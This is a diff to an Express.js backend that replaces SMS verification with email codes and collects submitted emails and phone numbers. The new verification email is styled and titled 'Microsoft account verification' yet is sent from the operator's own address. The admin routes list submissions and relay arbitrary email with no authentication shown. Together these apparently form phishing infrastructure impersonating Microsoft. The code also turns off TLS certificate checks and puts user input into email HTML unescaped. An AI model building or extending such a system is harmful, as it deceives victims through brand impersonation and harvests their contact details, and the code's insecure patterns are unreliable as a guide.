@@ -1,16 +1,15 @@
 ﻿import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
-import { Pool } from "@neondatabase/serverless";
+import pkg from "pg";
 import nodemailer from "nodemailer";
-import twilio from "twilio";
+import crypto from "crypto";
 import path from "path";
 import rateLimit from "express-rate-limit";
 
 dotenv.config();
 
 const app = express();
-
 const PORT = process.env.PORT || 4000;
 
 /* =========================
@@ -31,12 +30,10 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // Rate limiting
-const limiter = rateLimit({
+app.use(rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 100
-});
-
-app.use(limiter);
+}));
 
 /* =========================
    STATIC FILES
@@ -45,11 +42,14 @@ app.use(limiter);
 app.use(express.static(path.resolve(".")));
 
 /* =========================
-   DATABASE
+   DATABASE (pg + Neon)
 ========================= */
+
+const { Pool } = pkg;
 
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false } // REQUIRED for Neon
 });
 
 async function initDB() {
@@ -85,10 +85,8 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-const client = twilio(
-  process.env.TWILIO_ACCOUNT_SID,
-  process.env.TWILIO_AUTH_TOKEN
-);
+// In-memory store for email verification codes
+const emailCodes = new Map();
 
 /* =========================
    ROUTES
@@ -106,10 +104,7 @@ app.get("/admin", (req, res) => {
 
 // Health check
 app.get("/api-test", (req, res) => {
-  res.json({
-    success: true,
-    message: "API is running"
-  });
+  res.json({ success: true, message: "API is running" });
 });
 
 // Get submissions
@@ -121,104 +116,89 @@ app.get("/admin/submissions", async (req, res) => {
       ORDER BY created_at DESC
     `);
 
-    res.json({
-      success: true,
-      submissions: result.rows
-    });
-
+    res.json({ success: true, submissions: result.rows });
   } catch (err) {
     console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: "Failed to fetch submissions"
-    });
+    res.status(500).json({ success: false, error: "Failed to fetch submissions" });
   }
 });
 
-// Send verification code
-app.post("/send-code", async (req, res) => {
+// Send email verification code
+app.post("/send-email-code", async (req, res) => {
   try {
-    const { phone } = req.body;
+    const { email } = req.body;
 
-    if (!phone) {
-      return res.status(400).json({
-        success: false,
-        error: "Phone is required"
-      });
+    if (!email) {
+      return res.status(400).json({ success: false, error: "Email is required" });
     }
 
-    await client.verify.v2
-      .services(process.env.TWILIO_VERIFY_SERVICE_SID)
-      .verifications.create({
-        to: phone,
-        channel: "sms"
-      });
+    const code = crypto.randomInt(100000, 999999).toString();
+    const expiresAt = Date.now() + 10 * 60 * 1000;
 
-    res.json({
-      success: true
+    emailCodes.set(email.toLowerCase(), { code, expiresAt });
+
+    await transporter.sendMail({
+      from: `"${process.env.EMAIL_FROM_NAME}" <${process.env.EMAIL_FROM}>`,
+      to: email,
+      subject: "Your verification code",
+      html: `
+        <div style="font-family:Arial,sans-serif;max-width:480px;margin:0 auto;">
+          <h2 style="color:#0067b8;">Microsoft account verification</h2>
+          <p>Your verification code is:</p>
+          <div style="font-size:36px;font-weight:700;letter-spacing:8px;color:#1b1b1b;margin:20px 0;">${code}</div>
+          <p style="color:#605e5c;font-size:14px;">This code expires in 10 minutes.</p>
+        </div>
+      `
     });
+
+    res.json({ success: true });
 
   } catch (err) {
     console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: err.message
-    });
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// Verify code
-app.post("/verify-code", async (req, res) => {
+// Verify email code
+app.post("/verify-email-code", (req, res) => {
   try {
-    const { phone, code } = req.body;
+    const { email, code } = req.body;
 
-    if (!phone || !code) {
-      return res.status(400).json({
-        success: false,
-        error: "Phone and code are required"
-      });
+    if (!email || !code) {
+      return res.status(400).json({ success: false, error: "Email and code are required" });
     }
 
-    const verificationCheck = await client.verify.v2
-      .services(process.env.TWILIO_VERIFY_SERVICE_SID)
-      .verificationChecks.create({
-        to: phone,
-        code
-      });
+    const record = emailCodes.get(email.toLowerCase());
 
-    if (verificationCheck.status === "approved") {
-      return res.json({
-        success: true
-      });
+    if (!record) {
+      return res.status(400).json({ success: false, error: "No code found. Request a new one." });
     }
 
-    res.status(400).json({
-      success: false,
-      error: "Invalid code"
-    });
+    if (Date.now() > record.expiresAt) {
+      emailCodes.delete(email.toLowerCase());
+      return res.status(400).json({ success: false, error: "Code expired." });
+    }
+
+    if (record.code !== code.trim()) {
+      return res.status(400).json({ success: false, error: "Invalid code." });
+    }
+
+    emailCodes.delete(email.toLowerCase());
+    res.json({ success: true });
 
   } catch (err) {
     console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: err.message
-    });
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// Send email
+// Admin send email
 app.post("/admin/send-email", async (req, res) => {
   try {
     const { to, subject, message } = req.body;
 
     if (!to || !subject || !message) {
-      return res.status(400).json({
-        success: false,
-        error: "Missing required fields"
-      });
+      return res.status(400).json({ success: false, error: "Missing required fields" });
     }
 
     await transporter.sendMail({
@@ -228,18 +208,11 @@ app.post("/admin/send-email", async (req, res) => {
       html: message.replace(/\n/g, "<br>")
     });
 
-    res.json({
-      success: true,
-      message: "Email sent"
-    });
+    res.json({ success: true, message: "Email sent" });
 
   } catch (err) {
     console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: err.message
-    });
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
@@ -248,24 +221,15 @@ app.post("/submit", async (req, res) => {
   try {
     const { email, phone } = req.body;
 
-    // Validation
     if (!email || !phone) {
-      return res.status(400).json({
-        success: false,
-        error: "Email and phone are required"
-      });
+      return res.status(400).json({ success: false, error: "Email and phone are required" });
     }
 
-    // Save to database
     await pool.query(
-      `
-      INSERT INTO submissions (email, phone)
-      VALUES ($1, $2)
-      `,
+      `INSERT INTO submissions (email, phone) VALUES ($1, $2)`,
       [email, phone]
     );
 
-    // Send notification email
     await transporter.sendMail({
       from: `"${process.env.EMAIL_FROM_NAME}" <${process.env.EMAIL_FROM}>`,
       replyTo: process.env.EMAIL_REPLY_TO,
@@ -273,24 +237,16 @@ app.post("/submit", async (req, res) => {
       subject: "New Submission",
       html: `
         <h2>New Submission</h2>
-
         <p><strong>Email:</strong> ${email}</p>
         <p><strong>Phone:</strong> ${phone}</p>
       `
     });
 
-    res.json({
-      success: true,
-      message: "Submission received"
-    });
+    res.json({ success: true, message: "Submission received" });
 
   } catch (err) {
     console.error(err);
-
-    res.status(500).json({
-      success: false,
-      error: "Internal server error"
-    });
+    res.status(500).json({ success: false, error: "Internal server error" });
   }
 });
 
@@ -299,10 +255,7 @@ app.post("/submit", async (req, res) => {
 ========================= */
 
 app.use((req, res) => {
-  res.status(404).json({
-    success: false,
-    error: "Route not found"
-  });
+  res.status(404).json({ success: false, error: "Route not found" });
 });
 
 /* =========================
